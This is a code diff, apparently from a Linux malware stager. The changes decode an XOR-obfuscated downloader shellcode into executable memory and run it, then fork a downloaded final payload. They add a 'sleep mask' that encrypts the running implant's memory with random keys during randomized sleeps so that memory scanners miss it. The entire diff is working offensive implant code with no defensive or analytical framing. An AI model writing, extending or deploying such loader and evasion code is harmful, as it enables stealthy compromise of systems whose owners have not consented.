@@ -76,44 +76,28 @@ void stager_main(long *sp) {
   decode_config_string(dl_module_path, encoded_lib_path, sizeof(dl_module_path));
 #endif
 
-  // elf_load arguments: char *elf_start, void *stack, int stack_size, size_t *base_addr, size_t *entry, size_t *mapped_size, int pre_mapped, const char *module_path
-  int ret = elf_load((char *)dl_mem, NULL, 0, &dl_base, &dl_entry_addr, &dl_mapped_size, 0, dl_module_path[0] ? dl_module_path : NULL);
-  if (ret != 0) exit(1);
+  // Map memory for Downloader (shellcode)
+  // We need page-aligned memory for mprotect
+  size_t dl_map_len = (downloader_bin_len + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+  void *dl_exec = (void *)mmap(NULL, dl_map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (dl_exec == MAP_FAILED) exit(1);
+  
+  // Copy and decode downloader
+  unsigned char *dl_ptr = (unsigned char *)dl_exec;
+  for (int i = 0; i < downloader_bin_len; i++) {
+    dl_ptr[i] = downloader_bin[i] ^ downloader_key[i % 16];
+  }
 
   // Run Downloader
   typedef void (*dl_func)(struct download_result *);
-  dl_func dl_entry = (dl_func)dl_entry_addr;
+  dl_func dl_entry = (dl_func)dl_exec;
   
   struct download_result res = {0};
   dl_entry(&res);
 
   // Cleanup Downloader
-  // 1. Wipe and unmap the blob
-  memset(dl_mem, 0, downloader_bin_len);
-  munmap(dl_mem, downloader_bin_len);
-
-  // 2. Restore/Unmap the loaded ELF
-  if (dl_base && dl_mapped_size > 0) {
-      if (dl_module_path[0] != '\0') {
-          // Restore from file (put module back)
-          int fd = open(dl_module_path, O_RDONLY, 0);
-          if (fd >= 0) {
-              // Map over the existing stomped memory
-              // using MAP_FIXED to replace the mapping
-              void *restored = mmap((void *)dl_base, dl_mapped_size, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, fd, 0);
-              if (restored == MAP_FAILED) {
-                  // If failed, just unmap
-                  munmap((void *)dl_base, dl_mapped_size);
-              }
-              close(fd);
-          } else {
-              munmap((void *)dl_base, dl_mapped_size);
-          }
-      } else {
-          // Just unmap anonymous memory
-          munmap((void *)dl_base, dl_mapped_size);
-      }
-  }
+  memset(dl_exec, 0, dl_map_len);
+  munmap(dl_exec, dl_map_len);
 
   if (!res.data || res.size == 0) exit(1);
 
@@ -124,19 +108,49 @@ void stager_main(long *sp) {
   Elf_Ehdr *hdr = (Elf_Ehdr *)final_payload;
   if (hdr->e_type == ET_DYN) {
       // PIE
+      size_t min_vaddr = 0, max_vaddr = 0;
+      if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) exit(1);
+      size_t map_len = max_vaddr - min_vaddr;
+      
+      // Map shared memory in parent
+      void *shared_mem = (void *)mmap(NULL, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+      if (shared_mem == MAP_FAILED) exit(1);
+
       long pid = fork();
       if (pid == 0) {
-          elf_run(final_payload, argv, envp, 0, module_path);
+          // Child
+          // elf_run will handle loading and relocation into shared_mem
+          elf_run(final_payload, argv, envp, 1, module_path, (size_t)shared_mem);
           exit(0);
       } else if (pid > 0) {
           free(final_payload); // Clean up agent buffer
-          // Monitor loop (same as main.c)
+          uint8_t rotator_key[16] = {0};
           int status = 0;
           while (1) {
               long res = waitpid((int)pid, &status, WUNTRACED);
               if (res == pid) {
                   if (WIFEXITED(status) || WIFSIGNALED(status)) break;
-                  if (WIFSTOPPED(status)) kill((int)pid, SIGCONT);
+                  if (WIFSTOPPED(status)) {
+                      int sig = WSTOPSIG(status);
+                      if (sig == SIGSTOP) {
+                          // Sleep Mask (Mask)
+                          getrandom(rotator_key, 16, 0);
+                          xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                          
+                          // Sleep
+                          unsigned int sleep_s = 0;
+                          getrandom(&sleep_s, sizeof(sleep_s), 0);
+                          sleep_s = 180 + (sleep_s % 300);
+                          struct timespec req = {sleep_s, 0};
+                          nanosleep(&req, NULL);
+                          
+                          // Sleep Mask (Unmask)
+                          xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                          kill((int)pid, SIGCONT);
+                      } else {
+                          kill((int)pid, SIGCONT);
+                      }
+                  }
               }
               if (g_trap_requested) {
                   kill((int)pid, SIGKILL);
@@ -155,7 +169,7 @@ void stager_main(long *sp) {
 
       long pid = fork();
       if (pid == 0) {
-          elf_run(final_payload, argv, envp, 1, module_path);
+          elf_run(final_payload, argv, envp, 1, module_path, 0);
           exit(0);
       } else if (pid > 0) {
           free(final_payload);
